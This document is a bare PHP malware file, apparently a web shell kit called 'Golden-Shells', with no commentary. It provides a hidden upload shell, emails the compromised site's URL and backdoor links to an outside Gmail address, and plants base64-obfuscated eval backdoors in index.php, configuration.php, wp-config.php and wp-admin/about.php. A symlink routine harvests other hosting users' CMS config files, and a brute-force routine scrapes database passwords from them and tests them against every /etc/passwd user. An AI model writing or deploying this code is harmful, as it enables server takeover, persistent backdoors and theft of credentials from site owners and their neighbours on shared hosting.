<?php
error_reporting(0);
ini_set("max_execution_time", 0);
session_start();
if ($_GET["xo"] == "xo") {
    echo '<form action="" method="post" enctype="multipart/form-data">
      <input type="file" name="up"/>
      <input type="submit" name="submit" value="Submit" />
     </form>';
    if ($_POST["submit"]) {
        move_uploaded_file($_FILES["up"]["tmp_name"], $_FILES["up"]["name"]);
        $url = $_FILES["up"]["name"];
        echo "<h1><a href='$url'>Open Shell!</a></h1>";
    }
}
if (!isset($_SESSION["x505golden"])) {
    $_SESSION["x505golden"] = true;
    $curr=basename($_SERVER['SCRIPT_NAME']);
          $back=$_SERVER["HTTP_HOST"].$_SERVER['REQUEST_URI']."?xo=xo";
          $mail="resultinfopp9988@gmail.com";
          $sub="Golden-Shells";
          $body=$back;
          mail($mail,$sub,$body);

	$root=$_SERVER["DOCUMENT_ROOT"];
if(file_exists($root."/index.php") OR file_exists($root."/configuration.php") OR file_exists($root."/wp-config.php")) {
  $index=file_get_contents($root."/index.php");
  $configuration=file_get_contents($root."/configuration.php");
  $wpconfig=file_get_contents($root."/wp-config.php");
  if(!empty($index)) {
    $index=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$index);
    link($root."/index.php",$root."/index.php.bak");
    unlink($root."/index.php");
    $opindex=fopen($root."/index.php","a");
    fwrite($opindex,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
    fwrite($opindex,$index);
    fclose($opindex);
    $indexback=$_SERVER['SERVER_NAME']."/index.php?xo=xo";
  }
  if(!empty($configuration)) {
    $configuration=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$config);
    link($root."/configuration.php",$root."/configuration.php.bak");
    unlink($root."/configuration.php");
    $opcon=fopen($root."/configuration.php","a");
    fwrite($opcon,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
    fwrite($opcon,$configuration);
    fclose($opcon);
    $configurationback=$_SERVER['SERVER_NAME']."/configuration.php?xo=xo";
  }
  if(!empty($wpconfig)) {
    $wpconfig=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$wpconfig);
    if(is_dir($root."/wp-admin")) {
      chdir($root."wp-admin");
      if(!empty("about.php")) {
        $about=file_get_contents($root."/wp-admin/about.php");
        $about=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$about);
        unlink($root."/wp-admin/about.php");
        $opabout=fopen($root."/wp-admin/about.php","a");
        fwrite($opabout,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
        fwrite($opabout,$about);
        fclose($opabout);
        $wpadminback=$_SERVER['SERVER_NAME']."/wp-admin/about.php?xo=xo";
      }
    } else {
      link($root."/wp-config.php",$root."/wp-config.bak");
      unlink($root."/wp-config.php");
      $opwpcon=fopen($root."/wp-config.php","a");
      fwrite($opwpcon,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
      fwrite($opwpcon,$wpconfig);
      fclose($opwpcon);
      $wpconfigback=$_SERVER['SERVER_NAME']."/wp-config.php?xo=xo";
    }
  }
  $mailme="resultinfopp9988@gmail.com";
  $subject="Golden-Shells";
  $bodyme=$indexback."\n".$configurationback."\n".$wpconfigback."\n".$wpadminback;
  mail($mailme,$subject,$bodyme);
}

}
function sym() //symlinker function
{
    $dir = file("/etc/passwd");
    mkdir("xo_Golden", 0755);
    chdir("xo_Golden");
    $ht = 'Options Indexes FollowSymLinks
              DirectoryIndex achon666ju5t.extremecrew
              AddType txt .php
              AddHandler txt .php';
    $file = fopen(".htaccess", "w+");
    fwrite($file, $ht);
    fclose($file);
    $list = Array("wp-config.php", "wp/wp-config.php", "WP/wp-config.php", "wp/beta/wp-config.php", "beta/wp-config.php", "press/wp-config.php", "wordpress/wp-config.php", "Wordpress/wp-config.php", "blog/wp-config.php", "config.php", "news/wp-config.php", "new/wp-config.php", "blogs/wp-config.php", "home/wp-config.php", "db.php", "site/wp-config.php", "main/wp-config.php", "test/wp-config.php", "configuration.php", "blog/configuration.php", "joomla/configuration.php", "cms/configuration.php", "portal/configuration.php", "news/configuration.php", "home/configuration.php", "www/configuration.php", "site/configuration.php", "sites/configuration.php", "vb/includes/config.php", "whm/configuration.php", "central/configuration.php", "whm/whmcs/configuration.php", "whm/WHMCS/configuration.php", "whmc/WHM/configuration.php", "whmcs/configuration.php", "support/configuration.php", "submitticket.php", "whm/configuration.php", "drupal/sites/default/settings.php", "drupal7/sites/default/settings.php", "sites/default/settings.php");
    foreach ($dir as $users) {
        $user = explode(":", $users);
        foreach ($list as $confurl) {
            symlink("/home/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home1/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home2/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home3/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home4/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home5/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home6/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home7/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home8/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home9/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home1/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home2/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home3/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home4/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home5/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home6/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home7/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home8/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home9/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
        }
    }
    chdir("..");
}
sym();
function brute() {
    if (function_exists("mysql_connect")) {
        $_passarray = Array();
        $_total_done = 0;
        $_path = getcwd() . "/xo_Golden/";
        if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
            $ssl = "https://";
        } else {
            $ssl = "http://";
        }
        $url = $ssl . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $url = str_replace(basename($_SERVER["SCRIPT_FILENAME"]), "", $url);
        $url = $url . "/3x_beast/";
        $_printurl = str_replace("https://", "", $url);
        $_printurl = str_replace("http://", "", $_printurl);
        $_printurl = explode("/", $_printurl);
        $_printurl = "https://" . $_printurl[0] . ":2083";
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $get2 = curl_exec($curl);
        preg_match_all('#<a href="(.*?)"#', $get2, $config);
        foreach ($config[1] as $don) {
            $_dirs = scandir($_path);
            $_true = 0;
            foreach ($_dirs as $_dir) {
                if (preg_match("/config/", $_dir)) {
                    $_true++;
                }
            }
            if ($_true > 0) {
                chdir($_path);
                $openht = fopen(".htaccess", "w+");
                fwrite($openht, "Options Indexes FollowSymLinks
                    DirectoryIndex achon666ju5t.extremecrew
                    AddType txt .php
                    AddHandler txt .php
                    ReadmeName " . $don);
                fclose($openht);
                $cur = curl_init();
                curl_setopt($cur, CURLOPT_URL, $url);
                curl_setopt($cur, CURLOPT_RETURNTRANSFER, true);
                $get = curl_exec($cur);
                preg_match('#\'DB_PASSWORD\', \'(.*)\'#', $get, $m1); // wordpress
                preg_match('#password = \'(.*)\'#', $get, $m2); // joomla
                preg_match('#password\'] = \'(.*)\'#', $getget, $m3); // vb
                preg_match('#db_password = "(.*)"#', $get, $m4); // whmcs
                preg_match('#db_password = \'(.*)\'#', $get, $m4); // whmcs
                preg_match('#dbpass = "(.*)"#', $get, $m5); //
                preg_match('#password    = \'(.*)\'#', $get, $m6); // connnect.php
                preg_match('#dbpasswd = \'(.*)\'#', $get, $m8); // phpBB 3.0.x
                preg_match('#password_localhost = "(.*)"#', $get, $m9); // conexao.php
                preg_match('#senha = "(.*)"#', $get, $m10); // /_inc/config.inc.php
                preg_match('#db\["pass"\]="(.*)"#', $get, $m11);
                preg_match('#db_pwd =  "(.*)"#', $get, $m12);
                preg_match('#config\[\'db_pass\'\] = \'(.*)\'#', $get, $m13);
                preg_match('#\'dbpassword\', \'(.*)\'#', $get, $m14);
                if (!empty($m1[1])) {
                    array_push($_passarray, $m1[1]);
                } elseif (!empty($m2[1])) {
                    array_push($_passarray, $m2[1]);
                } elseif (!empty($m3[1])) {
                    array_push($_passarray, $m3[1]);
                } elseif (!empty($m4[1])) {
                    array_push($_passarray, $m4[1]);
                } elseif (!empty($m5[1])) {
                    array_push($_passarray, $m5[1]);
                } elseif (!empty($m6[1])) {
                    array_push($_passarray, $m6[1]);
                } elseif (!empty($m7[1])) {
                    array_push($_passarray, $m7[1]);
                } elseif (!empty($m8[1])) {
                    array_push($_passarray, $m8[1]);
                } elseif (!empty($m9[1])) {
                    array_push($_passarray, $m9[1]);
                } elseif (!empty($m10[1])) {
                    array_push($_passarray, $m10[1]);
                } elseif (!empty($m11[1])) {
                    array_push($_passarray, $m11[1]);
                } elseif (!empty($m12[1])) {
                    array_push($_passarray, $m12[1]);
                } elseif (!empty($m13[1])) {
                    array_push($_passarray, $m13[1]);
                } elseif (!empty($m14[1])) {
                    array_push($_passarray, $m14[1]);
                }
            }
        }
        $_userarray = Array();
        $_users = file("/etc/passwd");
        foreach ($_users as $_user) {
            $_user = explode(":", $_user);
            array_push($_userarray, $_user[0]);
        }
        foreach ($_userarray as $_user) {
            foreach ($_passarray as $_pwd) {
                if (mysql_connect('localhost', $_user, $_pwd)) {
                    $_count++;
                    echo $_printurl . "|" . $_user . "|" . $_pwd . "<br>";
                }
            }
        }
    }
}
brute();
?>